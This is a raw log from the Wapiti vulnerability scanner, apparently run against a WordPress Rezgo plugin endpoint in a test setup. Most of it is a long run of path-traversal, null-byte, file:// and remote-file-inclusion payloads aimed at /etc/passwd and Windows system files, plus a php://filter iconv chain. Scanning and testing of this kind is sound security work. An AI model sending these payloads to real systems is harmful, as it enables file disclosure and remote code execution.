2024-03-21 21:09:52.245 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:52.408 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-21 21:09:52.409 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_0f6d932f.db
2024-03-21 21:09:52.413 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
2024-03-21 21:09:52.461 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-21 21:09:52.461 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-21 21:09:52.464 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-21 21:09:52.792 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-21 21:09:52.792 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
2024-03-21 21:09:52.812 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:52.812 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F4zhcp4%2F1%2F74616773%2F (0)
2024-03-21 21:09:52.858 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=4zhcp4 for results, please wait...
2024-03-21 21:09:54.989 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
2024-03-21 21:09:55.012 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.019 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
2024-03-21 21:09:55.019 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
2024-03-21 21:09:55.091 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
2024-03-21 21:09:55.091 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
2024-03-21 21:09:55.173 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 21:09:55.187 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.187 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 21:09:55.196 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2F%2Fopenbugbounty.org%2F
2024-03-21 21:09:55.218 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 21:09:55.234 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.240 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 21:09:55.323 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 21:09:55.340 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz (0)
2024-03-21 21:09:55.345 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 21:09:55.352 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 21:09:55.359 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.367 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.374 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2Fetc%2Fservices (0)
2024-03-21 21:09:55.381 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:09:55.399 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 21:09:55.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 21:09:55.414 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.420 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.427 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 21:09:55.433 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 21:09:55.440 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-21 21:09:55.447 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.454 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.471 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.495 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.513 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.520 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.536 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.548 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 21:09:55.557 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.567 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.573 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.587 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.632 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.640 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.650 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.667 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.677 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.685 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.696 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.703 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:09:55.709 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.717 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.724 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.734 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:09:55.744 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.752 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.763 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=file%3A%2F%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.770 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:09:55.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
2024-03-21 21:09:55.788 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:09:55.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
2024-03-21 21:09:55.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
2024-03-21 21:09:55.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-content/plugins/rezgo/rezgo/templates/default/frame_header.php?tags=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
